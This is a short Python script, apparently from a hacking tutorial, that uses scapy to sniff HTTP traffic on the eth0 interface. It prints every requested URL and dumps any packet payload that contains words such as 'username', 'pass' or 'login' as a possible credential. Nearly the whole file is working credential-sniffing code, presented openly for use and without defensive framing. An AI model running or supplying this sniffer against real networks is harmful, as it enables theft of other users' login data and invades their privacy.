#!/usr/bin/python

import scapy.all as scapy
from scapy.layers import http


'''
Setup sniff, filtering IP traffic from interface we pass.
'''
def sniff(interface):
	# interface is the packet we capture data from. 
	# store tells scapy to store packets in memory.
	# prn specifies a call back function.
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


'''
Function will take a packet and filter and extract data from the Raw layer.
'''
def process_sniffed_packet(packet):

	if packet.haslayer(http.HTTPRequest):
		#print(packet.show())
		
		#Extracting URLs From a Specific Layer
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print("\n\n[-] HTTP Request >> " + str(url) + "\n\n")
		
		#Extracting Data From a Specific Layer 
		if packet.haslayer(scapy.Raw):
			# Printng the Raw layer and the load field of the layer..
			# print(packet[scapy.Raw].load)
			load = str(packet[scapy.Raw].load)
			keywords = ["username", "user", "pass", "password", "pwd", "login"]
			for keyword in keywords:
				if keyword in load:
					print("\n\n[+] Possible username/password > " + load + "\n\n")
					break
sniff("eth0")
